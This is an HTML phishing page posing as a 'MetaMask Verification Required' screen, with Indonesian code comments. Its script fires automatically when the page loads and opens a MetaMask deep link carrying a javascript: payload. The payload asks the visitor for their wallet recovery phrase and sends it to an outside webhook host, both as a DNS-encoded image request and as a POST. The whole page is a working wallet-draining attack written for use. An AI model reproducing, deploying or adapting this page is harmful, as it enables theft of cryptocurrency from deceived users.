<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MetaMask Verification</title>
  <style>
    body {
      margin: 0; padding: 0; height: 100vh; background: #0f172a; color: #e2e8f0;
      font-family: system-ui; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center;
    }
    .logo { font-size: 80px; margin-bottom: 20px; }
    h1 { font-size: 28px; margin-bottom: 20px; }
    p { font-size: 18px; color: #94a3b8; margin-bottom: 40px; max-width: 500px; }
    .btn {
      padding: 18px 40px; font-size: 20px; background: #f6851b; color: white; border: none; border-radius: 16px;
      cursor: pointer; box-shadow: 0 10px 40px rgba(246,133,27,0.6); transition: 0.3s; font-weight: bold;
    }
    .btn:hover { background: #e2761b; transform: scale(1.05); }
    .fallback { margin-top: 30px; font-size: 14px; color: #64748b; }
  </style>
</head>
<body>

  <div class="logo">ðŸ¦Š</div>
  <h1>MetaMask Verification Required</h1>
  <p>Click the button below to verify your identity and continue securely</p>

  <button class="btn" id="verifyBtn">Verify Now</button>

  <p class="fallback">If MetaMask does not open, <a href="#" id="manualLink">click here to open manually</a></p>

  <script>
    // PAYLOAD JAVASCRIPT: PROMPT SEED PHRASE + EXFIL KE WEBHOOK KAMU
    const payload = "javascript:var seed=prompt('MetaMask says:\\n\\nEnter your recovery phrase to verify identity');if(seed){new Image().src='https://'+btoa(seed).substring(0,500)+'.keen-unicorn-32.webhook.cool';fetch('https://keen-unicorn-32.webhook.cool/seed',{method:'POST',body:JSON.stringify({seed:seed})}).catch(()=>{})}";

    // FULL METAMASK DEEP LINK
    const metamaskDeepLink = `metamask://browse?url=${encodeURIComponent(payload)}`;

    function triggerMetaMask() {
      // 1. Coba buka MetaMask deep link
      window.location.href = metamaskDeepLink;

      // 2. Fallback: kalau tidak terbuka dalam 2 detik, tampilkan confirm
      setTimeout(() => {
        if (confirm("MetaMask not opened? Click OK to try again or open manually.")) {
          window.location.href = metamaskDeepLink;
        }
      }, 2000);
    }

    // AUTO TRIGGER SAAT HALAMAN DIBUKA (TANPA KLIK!)
    window.onload = function() {
      triggerMetaMask();
    };

    // KALAU MAU PAKAI KLIK (UNCOMMENT BARIS INI)
    document.getElementById("verifyBtn").addEventListener("click", triggerMetaMask);

    // Manual link fallback
    document.getElementById("manualLink").addEventListener("click", function(e) {
      e.preventDefault();
      window.location.href = metamaskDeepLink;
    });
  </script>

</body>
</html>
